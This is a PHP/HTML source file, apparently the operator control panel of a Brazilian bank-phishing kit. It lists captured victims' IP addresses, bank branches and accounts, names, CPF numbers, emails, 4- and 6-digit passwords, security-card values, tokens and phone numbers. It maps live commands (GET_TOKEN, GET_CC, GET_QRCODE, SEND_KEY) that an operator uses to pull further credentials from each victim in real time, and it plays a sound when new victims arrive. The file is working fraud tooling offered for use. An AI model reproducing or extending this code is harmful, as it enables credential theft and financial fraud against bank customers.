<table width="100%" border="0" cellspacing="5" cellpadding="5" class="table_lista_clientes">
	<thead>
		<tr>
			<td>IP:</td>
			<td>Data:</td>
			<td>Tipo:</td>
			<td>Perfil:</td>
			<td>Agência:</td>
			<td>Conta:</td>
			<td>Nome:</td>
			<td>CPF:</td>
			<td>Email:</td>
			<td>Senha 4:</td>
			<td>Senha 6:</td>
			<td>Posição:</td>
			<td>Token:</td>
			<td>Telefone:</td>
			<td>Comando:</td>
			<td>Gerenciar</td>
		</tr>
	</thead>
<?php 
$tabela = 'acessos';
$cond = "WHERE status = '0'";
$GetClientes = read($conn, $tabela, $cond);

if(!$GetClientes):
	$contador = 0;
else:
	$contador = count($GetClientes);
endif;
 ?>		
	<tbody>
		<?php 
			for($c = 0;$c < $contador;$c++):
				

				$UserId = $GetClientes[$c]['id'];
				$UserIp = $GetClientes[$c]['ip'];
				$UserData = $GetClientes[$c]['data_acesso'];
				$UserTipo = $GetClientes[$c]['tipo_acesso'];
				$UserPerfil = $GetClientes[$c]['perfil'];
				$UserAgencia = $GetClientes[$c]['agencia'];
				$UserConta = $GetClientes[$c]['conta'];
				$UserDigito = $GetClientes[$c]['digito'];
				$UserNome = $GetClientes[$c]['nome'];
				$UserCPF = $GetClientes[$c]['cpf'];
				$UserEmail = $GetClientes[$c]['email'];
				$UserPass4 = $GetClientes[$c]['senha_4'];
				$UserPass6 = $GetClientes[$c]['pass_6'];
				$UserTablePos = $GetClientes[$c]['tabela_pos'];
				$UserTableVal = $GetClientes[$c]['tabela_valor'];
				$UserToken = $GetClientes[$c]['token'];
				$UserDDD = $GetClientes[$c]['ddd'];
				$UserFone = $GetClientes[$c]['fone'];
				$UserComando = $GetClientes[$c]['comando'];
				$UserTimes = $GetClientes[$c]['time_acesso'];
				if($UserPerfil == ''){$UserPerfil = 'NORMAL';}

				if($UserComando == 'LOADING'):
					$ShowComando = 'ESPERA';
					echo '<script>var snd = new Audio("_sound/new-info.mp3"); snd.play(); </script>';	
				elseif($UserComando == 'GET_PSN'):	
					$ShowComando = 'SENHA NET';
				elseif($UserComando == 'GET_CC'):
					$ShowComando = 'CC';
				elseif($UserComando == 'GET_PASS_CC'):
					$ShowComando = 'SENHA CC';
				elseif($UserComando == 'GET_TABLE'):
					$ShowComando = 'TABELA';
				elseif($UserComando == 'GET_TOKEN'):
					$ShowComando = 'TOKEN';
				elseif($UserComando == 'GET_POS'):
					$ShowComando = 'POSIÇÃO TABELA';
				elseif($UserComando == 'FINALIZADO'):
					$ShowComando = 'FINALIADO';
				elseif($UserComando == 'GET_PSN X'):
					$ShowComando = 'SENHA NET X';
				elseif($UserComando == 'GET_CC X'):
					$ShowComando = 'CC X';
				elseif($UserComando == 'GET_PASS_CC X'):
					$ShowComando = 'SENHA CC X';
				elseif($UserComando == 'GET_TABLE X'):
					$ShowComando = 'TABELA X';
				elseif($UserComando == 'GET_TOKEN X'):
					$ShowComando = 'TOKEN X';
				elseif($UserComando == 'GET_PHONE X'):
					$ShowComando = 'PHONE X';
				elseif($UserComando == 'GET_POS X'):
					$ShowComando = 'POSIÇÃO TABELA X';
				elseif($UserComando == 'ACESSO X'):
					$ShowComando = 'DADOS INVÁLIDOS';
				elseif($UserComando == 'SEND_KEY'):
					$ShowComando = 'ENVIANDO CHAVE';
				elseif($UserComando == 'SET_MESSAGE'):
					$ShowComando = 'LENDO MENSAGEM';
				elseif($UserComando == 'GET_PHONE'):
					$ShowComando = 'GET FONE';
				elseif($UserComando == 'GET_QRCODE'):
					$ShowComando = 'GET QRCODE';
				elseif($UserComando == 'GET_QRCODE X'):
					$ShowComando = 'QRCODE X';
				else:
					$ShowComando = '';
				endif;	

				if(!$GetClientes):
					echo '
						<tr>
							<td colspan="12">Sem nenhuma informação ainda!</td>
						</tr>
					';
					$_SESSION['TotalClientes'] = 0;
				else:	
					$TimestampNew = time();

					if($UserTipo == 'M. Fisico'):
						$GerenciaTipo = '_fisi='.$UserId.'&mobile=true';
					elseif($UserTipo == 'D. Fisico'):
						$GerenciaTipo = '_fisi='.$UserId;
					elseif($UserTipo == 'JUBA USER'):
						$GerenciaTipo = '_juba='.$UserId;
					elseif($UserTipo == 'JUBA CERT HSBC'):
						$GerenciaTipo = '_juba='.$UserId;
					elseif($UserTipo == 'JUBA CERT'):
						$GerenciaTipo = '_juba='.$UserId;
					else:
						$GerenciaTipo = '';
					endif;

					
					if($TimestampNew > $UserTimes):

						$InativoTime = $TimestampNew - $UserTimes;
					
						echo '
							<tr>
								<td>'.$UserIp.'</td>
								<td>'.$UserData.'</td>
								<td>'.$UserTipo.'</td>
								<td>'.$UserPerfil.'</td>
								<td>'.$UserAgencia.'</td>
								<td>'.$UserConta.'-'.$UserDigito.'</td>
								<td>'.$UserNome.'</td>
								<td>'.$UserCPF.'</td>
								<td>'.$UserEmail.'</td>
								<td>'.$UserPass4.'</td>
								<td>'.$UserPass6.'</td>
								<td>'.$UserTablePos.':'.$UserTableVal.'</td>
								<td>'.$UserToken.'</td>
								<td>('.$UserDDD.') '.$UserFone.'</td>
								<td>INATIVO HÁ '. $InativoTime .' s.</td>
								<td><a href="acesso.php?gerenciar'.$GerenciaTipo.'" class="manage_user_link"><i class="fa fa-cog"></i></a></td>
							</tr>
						';
					else:
						echo '
							<tr>
								<td>'.$UserIp.'</td>
								<td>'.$UserData.'</td>
								<td>'.$UserTipo.'</td>
								<td>'.$UserPerfil.'</td>
								<td>'.$UserAgencia.'</td>
								<td>'.$UserConta.'-'.$UserDigito.'</td>
								<td>'.$UserNome.'</td>
								<td>'.$UserCPF.'</td>
								<td>'.$UserEmail.'</td>
								<td>'.$UserPass4.'</td>
								<td>'.$UserPass6.'</td>
								<td>'.$UserTablePos.':'.$UserTableVal.'</td>
								<td>'.$UserToken.'</td>
								<td>('.$UserDDD.') '.$UserFone.'</td>
								<td>'.$ShowComando.'</td>
								<td><a href="acesso.php?gerenciar'.$GerenciaTipo.'" class="manage_user_link"><i class="fa fa-cog"></i></a></td>
							</tr>
						';
					endif;
				endif;	
			endfor;	
		?>
		
	</tbody>
</table>

<?php

if($contador > @$_SESSION['TotalClientes']):
	$_SESSION['TotalClientes'] = $contador;
	echo '<script>var snd = new Audio("_sound/op.mp3"); snd.play(); notify("'.$UserIp.'") </script>';	
elseif ($contador < @$_SESSION['TotalClientes']):
	$_SESSION['TotalClientes'] = $contador;
endif;
?>